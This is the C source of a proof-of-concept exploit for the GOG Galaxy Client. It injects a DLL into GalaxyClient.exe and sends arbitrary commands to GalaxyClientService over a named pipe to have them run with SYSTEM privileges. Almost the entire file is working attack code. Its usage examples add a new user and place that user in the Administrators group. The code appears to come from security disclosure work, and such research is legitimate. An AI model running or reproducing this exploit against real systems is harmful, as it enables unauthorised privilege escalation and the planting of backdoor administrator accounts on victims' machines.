/* galaxy_dll_inject_privesc.c
 * Copyright (C) 2020  Joe Testa <jtesta@positronsecurity.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms version 3 of the GNU General Public License as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
 * This GOG Galaxy Client proof-of-concept exploit will communicate with
 * the GalaxyClientService Windows service (via 127.0.0.1:9978) and
 * requests that it execute arbitrary commands with SYSTEM privileges.
 * The service authenticates requests using an HMAC, but unfortunately,
 * the static key is hard-coded in the GalaxyClientService.exe
 * executable.
 *
 * This POC is designed for use against Galaxy Client v2.0.13 - v2.0.15.
 * Prior versions allowed anyone to communicate with the
 * GalaxyClientService, but these versions require client sockets be
 * created from GalaxyClient.exe.  Hence, we must inject code into
 * GalaxyClient.exe in order to successfully trigger the exploit.
 *
 * This source file forms the front-end of the exploit, which is
 * responsible for injecting galaxy_dll_inject_privesc.dll into the
 * GalaxyClient.exe process, so that it can communicate with the
 * GalaxyClientService and execute commands.
 */

#include <windows.h>
#include <psapi.h>
#include <stdio.h>


/* Returns the PID of GalaxyClient.exe, or 0 if not found. */
unsigned int get_galaxy_client_pid(void) {
  DWORD process_ids[2048] = {0};
  DWORD pids_written = 0, num_process_ids = 0;
  unsigned int ret = 0, i = 0;


  /* Enumerate all process IDs in the system. */
  if (!EnumProcesses(process_ids, sizeof(process_ids), &pids_written)) {
    printf("EnumProcesses failed: %lu\n", GetLastError());
    return -1;
  }
  num_process_ids = pids_written / sizeof(DWORD);

  /* For each process ID, get its file name. */
  for (i = 0; i < num_process_ids; i++) {
    if (process_ids[i] != 0) {
      char process_name[MAX_PATH] = {0};
      HANDLE process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_ids[i]);
      if (process_handle != NULL) {
        HMODULE module_handle = NULL;
        DWORD written = 0;

        if (EnumProcessModules(process_handle, &module_handle, sizeof(module_handle), &written)) {
          GetModuleBaseName(process_handle, module_handle, process_name, sizeof(process_name));
          /* Is this GalaxyClient.exe?  If so, set the target PID and stop looping. */
          if (strcmp(process_name, "GalaxyClient.exe") == 0) {
            ret = process_ids[i];
            break;
          }

        }
      }
      CloseHandle(process_handle);
    }
  }

  return ret;
}


/* Injects a DLL into a target process ID. Taken directly from
 * <https://en.wikipedia.org/wiki/DLL_injection#Sample_Code>. */
HANDLE inject_DLL(HANDLE *h_process, const char* file_name, int PID)
{
    h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);                   //retrieving a handle to the target process

    char fullDLLPath[_MAX_PATH];                                                      //getting the full path of the dll file
    GetFullPathName(file_name, _MAX_PATH, fullDLLPath, NULL);

    LPVOID DLLPath_addr = VirtualAllocEx(h_process, NULL, _MAX_PATH,
                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);                  //allocating memory in the target process
    WriteProcessMemory(h_process, DLLPath_addr, fullDLLPath,
                       strlen(fullDLLPath), NULL);                                    //writing the dll path into that memory

    LPVOID LoadLib_addr = GetProcAddress(GetModuleHandle("Kernel32"),                 //getting LoadLibraryA address (same across
                                         "LoadLibraryA");                             //  all processes) to start execution at it

    HANDLE h_rThread = CreateRemoteThread(h_process, NULL, 0,                         //starting a remote execution thread at LoadLibraryA
                       (LPTHREAD_START_ROUTINE)LoadLib_addr, DLLPath_addr, 0, NULL);  //  and passing the dll path as an argument

    //WaitForSingleObject(h_rThread, INFINITE);                                         //waiting for it to be finished

    //DWORD exit_code;
    //GetExitCodeThread(h_rThread, &exit_code);                                         //retrieving the return value, i.e., the module
                                                                                      //  handle returned by LoadLibraryA

    //CloseHandle(h_rThread);                                                           //freeing the injected thread handle,
    //VirtualFreeEx(h_process, DLLPath_addr, 0, MEM_RELEASE);                           //... and the memory allocated for the DLL path,
    //CloseHandle(h_process);                                                           //... and the handle for the target process

    //return (HANDLE)exit_code;
    return h_rThread;
}


int main(int ac, char **av) {
  char dll_path[512] = {0};
  DWORD bytes_written = 0, bytes_read = 0;
  unsigned int key_selector = 0, pipe_wait_time = 0, command_len = 0, args_len = 0, working_dir_len = 0, status = 0;
  int target_pid = -1;
  char *key = NULL, *command = NULL, *args = NULL, *working_dir = NULL;
  HANDLE hProcess = INVALID_HANDLE_VALUE, hPipe = INVALID_HANDLE_VALUE, remote_thread_handle = INVALID_HANDLE_VALUE;
  LPVOID DLLPath_addr = NULL;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;


  if (ac != 5) {
    fprintf(stderr, "Usage: %s [--key1|--key2] command args working_directory\n\n", av[0]);
    fprintf(stderr, "Notes:\n");
    fprintf(stderr, "  Use --key1 when running against GOG Galaxy Client v2.0.15.\n");
    fprintf(stderr, "  Use --key2 when running against GOG Galaxy Client v2.0.19.\n");
    fprintf(stderr, "  It is not known which key is used in versions 2.0.16 through 2.0.18 (they are untested), so experiment with both --key1 and --key2 to see which works.\n\n");
    fprintf(stderr, "Example: %s --key2 C:\\Windows\\System32\\net.exe \"user jtesta Abc*123Lol /add\" \"C:\\\\\"\n", av[0]);
    fprintf(stderr, "Example: %s --key2 C:\\Windows\\System32\\net.exe \"localgroup Administrators jtesta /add\" \"C:\\\\\"\n", av[0]);
    return -1;
  }

  key = av[1];
  command = av[2];
  args = av[3];
  working_dir = av[4];


  if (strcmp(key, "--key1") == 0)
    key_selector = 1;
  else if (strcmp(key, "--key2") == 0)
    key_selector = 2;
  else {
    fprintf(stderr, "Error: first argument must be either --key1 or --key2.\n");
    return -1;
  }
  
  command_len = strlen(command);
  args_len = strlen(args);
  working_dir_len = strlen(working_dir);  


  /* Resolve DLL to its full path name. */
  if (GetFullPathNameA("galaxy_dll_inject_privesc.dll", sizeof(dll_path), dll_path, NULL) == 0) {
    printf("Failed to get full path of galaxy_dll_inject_privesc.dll: %lu\n", GetLastError());
    return -1;
  }

  /* Execute "sc start GalaxyClientService" to ensure that the service is on and ready for exploitation. */
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;  /* Suppress stdout of sc.exe. */
  ZeroMemory(&pi, sizeof(pi));

  printf("Starting GalaxyClientService...\n");
  if (!CreateProcess(NULL, "C:\\Windows\\System32\\sc.exe start GalaxyClientService", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
    fprintf(stderr, "Failed to run C:\\Windows\\System32\\sc.exe start GalaxyClientService: %lu\n", GetLastError());
    return -1;
  }
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  /* See if GalaxyClient.exe is already running.  If not, we need to start it ourselves. */
  target_pid = get_galaxy_client_pid();
  if (target_pid != 0)
    printf("GalaxyClient.exe is already running.  PID: %u\n", target_pid);
  else {

    /* Reset the STARTUP_INFO and PROCESS_INFORMATION structs for GalaxyClient.exe. */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    printf("Executing C:\\Program Files (x86)\\GOG Galaxy\\GalaxyClient.exe...\n");
    if (!CreateProcess(NULL, "C:\\Program Files (x86)\\GOG Galaxy\\GalaxyClient.exe", NULL, NULL, FALSE, 0, NULL, "C:\\Program Files (x86)\\GOG Galaxy", &si, &pi)) {
      fprintf(stderr, "Failed to start C:\\Program Files (x86)\\GOG Galaxy\\GalaxyClient.exe: %lu\n", GetLastError());
      return -1;
    }
    target_pid = pi.dwProcessId;
    printf("PID of new GalaxyClient.exe process: %u\n", target_pid);
    /*
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
    */

    /* Exploit sometimes fails without letting the process initialize a little more
     * before injecting into it.  Not sure why.  So we'll wait 2 seconds before
     * continuing. */
    Sleep(2000);
  }

  printf("Injecting DLL...\n");
  remote_thread_handle = inject_DLL(&hProcess, dll_path, target_pid);
  if (remote_thread_handle == INVALID_HANDLE_VALUE) {
    fprintf(stderr, "Failed to inject DLL: %lu\n", GetLastError());
    return -1;
  }

  printf("DLL injected.  Waiting up to 30 seconds for pipe server to start...\n");
  while (hPipe == INVALID_HANDLE_VALUE) {
    if (pipe_wait_time >= 30000) {
      fprintf(stderr, "Failed to connect to pipe server after 30 seconds.\n");
      return -1;
    }

    Sleep(500);
    pipe_wait_time += 500;
    hPipe = CreateFile("\\\\.\\pipe\\galaxy_poc", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
  }

  printf("Connected to pipe server.  Sending command, args, and working directory...\n");

  /* Write the key selector. */
  if (!WriteFile(hPipe, &key_selector, sizeof(key_selector), &bytes_written, NULL)) {
    fprintf(stderr, "Failed to write key selector.\n");
    return -1;
  }
  
  /* Write the command length. */
  if (!WriteFile(hPipe, &command_len, sizeof(command_len), &bytes_written, NULL)) {
    fprintf(stderr, "Failed to write command length.\n");
    return -1;
  }

  /* Write the command. */
  if (!WriteFile(hPipe, command, command_len, &bytes_written, NULL)) {
    fprintf(stderr, "Failed to write command.\n");
    return -1;
  }

  /* Write the args length. */
  if (!WriteFile(hPipe, &args_len, sizeof(args_len), &bytes_written, NULL)) {
    fprintf(stderr, "Failed to write args length.\n");
    return -1;
  }

  /* Write the args. */
  if (!WriteFile(hPipe, args, args_len, &bytes_written, NULL)) {
    fprintf(stderr, "Failed to write args.\n");
    return -1;
  }

  /* Write the working_dir length. */
  if (!WriteFile(hPipe, &working_dir_len, sizeof(working_dir_len), &bytes_written, NULL)) {
    fprintf(stderr, "Failed to write working directory length.\n");
    return -1;
  }

  /* Write the working_dir. */
  if (!WriteFile(hPipe, working_dir, working_dir_len, &bytes_written, NULL)) {
    fprintf(stderr, "Failed to write working directory.\n");
    return -1;
  }

  printf("Sent.  Waiting for response...\n");

  /* Read the response */
  if (!ReadFile(hPipe, &status, sizeof(status), &bytes_read, NULL)) {
    fprintf(stderr, "Failed to read response: %lu\n", GetLastError());
    return -1;
  }

  CloseHandle(hPipe);
  if (status == 1)
    printf("\nSuccess!\n");
  else
    printf("\nFailed. :(\n");

  VirtualFreeEx(hProcess, DLLPath_addr, 0, MEM_RELEASE);
  CloseHandle(hProcess);

  /* Kill GalaxyClient.exe.  With more exploit development effort, we could send
   * multiple commands through a single process instance, but I already spent too
   * much time on this.  It's easier to just kill the process and then fire up
   * another one for the next command (if any). */
  {
    HANDLE galaxy_client_handle = OpenProcess(PROCESS_TERMINATE, FALSE, target_pid);
    if (!TerminateProcess(galaxy_client_handle, 0)) {
      fprintf(stderr, "Failed to terminate GalaxyClient.exe (PID %u).  Subsequent commands will likely fail until this process is manually terminated.\n", target_pid);
    }
  }
  return 0;
}
